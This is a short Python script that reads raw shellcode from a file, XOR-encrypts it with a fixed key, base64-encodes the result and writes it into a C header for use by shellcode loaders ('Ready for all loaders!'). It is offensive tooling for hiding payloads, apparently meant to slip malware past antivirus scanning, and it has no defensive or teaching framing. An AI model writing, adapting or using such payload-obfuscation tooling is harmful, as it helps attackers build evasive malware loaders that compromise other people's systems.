#!/usr/bin/env python3
import base64
import sys

XOR_KEY = 0xAA

def xor_shellcode(shellcode_bytes, key):
    return bytes(b ^ key for b in shellcode_bytes)

try:
    with open('shellcode.bin', 'rb') as f:
        shellcode = f.read()
    print(f"[+] Shellcode loaded: {len(shellcode)} bytes")
    
    encrypted = xor_shellcode(shellcode, XOR_KEY)
    b64_encoded = base64.b64encode(encrypted).decode()
    
    with open('shellcode.h', 'w') as f:
        f.write('#ifndef SHELLCODE_H\n')
        f.write('#define SHELLCODE_H\n\n')
        f.write(f'#define XOR_KEY 0x{XOR_KEY:02X}\n\n')
        f.write(f'const char* b64_shellcode = "{b64_encoded}";\n\n')
        f.write('#endif\n')
    
    print(f"[+] shellcode.h generated: {len(b64_encoded)} chars")
    print("[+] Ready for all loaders!")
    
except FileNotFoundError:
    print("ERROR: shellcode.bin not found!")
    sys.exit(1)
